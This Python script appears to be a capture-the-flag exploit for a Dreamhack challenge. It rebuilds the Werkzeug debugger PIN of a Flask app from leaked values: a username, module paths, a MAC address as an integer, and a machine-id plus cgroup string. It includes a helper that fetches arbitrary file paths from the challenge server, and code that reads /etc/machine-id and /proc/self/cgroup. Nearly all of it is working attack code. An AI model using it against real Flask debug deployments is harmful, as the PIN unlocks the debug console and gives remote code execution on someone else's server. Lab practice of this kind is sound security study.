import requests
import hashlib
from itertools import chain

def generate_machine_code():
    linux = b""

    # machine-id is stable across boots, boot_id is not.
    for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
        try:
            with open(filename, "rb") as f:
                value = f.readline().strip()
        except IOError:
            continue

        if value:
            linux += value
            break

    # Containers share the same machine id, add some cgroup
    # information. This is used outside containers too but should be
    # relatively stable across boots.
    try:
        with open("/proc/self/cgroup", "rb") as f:
            linux += f.readline().strip().rpartition(b"/")[2]
    except IOError:
        pass

    if linux:
        return linux

def generate_pin_code():
    probably_public_bits = [
        'dreamhack', # username
        'flask.app',# modname 고정
        'Flask',    # getattr(app, '__name__', getattr(app.__class__, '__name__')) 고정
        '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
                                                            # python 버전 마다 위치 다름
    ]
    
    private_bits = [
        '187999308497153',  # MAC주소를 int형으로 변환한 값,  'aa:fc:00:00:16:01'
        b'c31eea55a29431535ff01de94bdcf5cflibpod-02f80dffdf6b5c197362e55ac6eae56e0b4c7c578407eb740c1ea5bbc6325bdb'   # get_machine_id()
    ]
    
    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    # h.update(b'shittysalt')
    
    cookie_name = '__wzd' + h.hexdigest()[:20]
    
    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]
    
    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num
    
    print(rv)

def get_file(file_path):
    url = 'http://host1.dreamhack.games:17585'
    res = requests.get(url + file_path)
    print(res.text)

if __name__ == "__main__":
    generate_pin_code()